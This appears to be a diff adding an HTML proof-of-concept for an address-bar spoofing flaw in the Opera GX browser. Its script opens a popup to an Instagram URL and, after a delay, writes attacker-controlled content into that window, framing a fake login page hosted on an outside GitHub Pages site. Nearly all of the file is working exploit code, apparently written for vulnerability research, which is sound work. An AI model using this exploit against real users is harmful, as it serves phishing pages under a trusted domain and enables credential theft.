@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Address Bar Spoofing PoC</title>
+
+<style>
+body{
+    font-family: Arial, sans-serif;
+    text-align:center;
+    margin-top:80px;
+}
+
+iframe{
+    width:90%;
+    height:80vh;
+    border:1px solid #ccc;
+}
+
+.note{
+    color:red;
+    font-size:13px;
+    margin-bottom:10px;
+}
+</style>
+
+<script>
+
+function startTest(){
+
+    const targetURL = "https://instagram.com:90";
+
+    const win = window.open(targetURL);
+
+    if(!win){
+        alert("Popup blocked. Please allow popups for this test.");
+        return;
+    }
+
+    setTimeout(function(){
+
+        try{
+
+            win.document.open();
+
+            win.document.write(`
+                <html>
+                <body style="font-family:Arial;text-align:center;margin-top:40px;">
+
+                <p class="note">
+                Fake content below is attacker-controlled.
+                </p>
+
+                <iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
+
+                </body>
+                </html>
+            `);
+
+            win.document.close();
+
+        }catch(e){
+            // blocked by browser security
+        }
+
+    },3000);
+}
+
+</script>
+</head>
+
+<body>
+
+<h2>Opera GX Address Bar Spoofing Test</h2>
+
+<button onclick="startTest()">Start Test</button>
+
+</body>
+</html>
